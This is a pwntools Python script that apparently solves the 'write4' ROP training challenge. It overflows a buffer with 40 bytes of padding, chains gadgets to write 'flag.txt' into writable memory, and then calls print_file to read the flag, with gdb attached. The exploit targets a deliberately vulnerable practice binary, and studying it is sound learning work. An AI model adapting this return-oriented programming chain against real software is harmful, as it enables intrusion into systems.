from pwn import *

context.arch = "x86_64"

elf = ELF("./write4")

gs = """
b *pwnme+152
c
"""

io = gdb.debug(elf.path)

# parameters order: RDI, RSI, RDX, RCX, R8, R9
mov_ptr_r14_r15 = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
pop_rdi = 0x0000000000400693 # pop rdi ; ret
hold_flag = 0x0601048 # extern int32_t __libc_start_main
call_print_file = 0x0400620

def write(to, what):
    return flat(
            pop_r14_r15,
            to,
            what,
            mov_ptr_r14_r15
            )

io.sendline(b"A" * 40 + \
        write(hold_flag, "flag.txt") + \
        p64(pop_rdi) + \
        p64(hold_flag) + \
        p64(call_print_file))

io.interactive()
